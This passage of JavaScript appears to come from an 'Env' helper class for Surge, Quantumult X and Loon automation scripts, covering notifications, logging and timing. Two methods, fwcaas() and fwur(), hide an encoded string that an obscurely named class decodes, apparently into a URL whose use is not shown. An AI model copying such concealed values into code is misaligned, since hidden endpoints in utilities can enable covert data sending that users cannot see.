              "open-url": e,
              "media-url": s
            };
          }

          if (this["isSurge"]()) {
            let e = t["url"] || t["openUrl"] || t["open-url"];
            return {
              "url": e
            };
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](e, s, i, o(r)) : this["isQuanX"]() && $notify(e, s, i, o(r))), !this["isMuteLog"]) {
        let t = ["", "==============📣系统通知📣=============="];
        t["push"](e);
        s && t["push"](s);
        i && t["push"](i);
        console["log"](t["join"]("\n"));
        this["logs"] = this["logs"]["concat"](t);
      }
    }

    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    log(...t) {
      t["length"] > 0 && (this["logs"] = [...this["logs"], ...t]);
      console["log"](t["join"](this["logSeparator"]));
    }

    logErr(t, e) {
      const s = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
      s ? this["log"]("", `❗️${this["name"]}, 错误!`, t["stack"]) : this["log"]("", `❗️${this["name"]}, 错误!`, t);
    }

    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas["decode"](this["fwcaas"]());
    }

    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }

    done(t = {}) {
      const e = new Date()["getTime"](),
            s = (e - this["startTime"]) / 1e3;
      this["log"]("", `🔔${this["name"]}, 结束! 🕛 ${s} 秒`);
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(t, e);
}
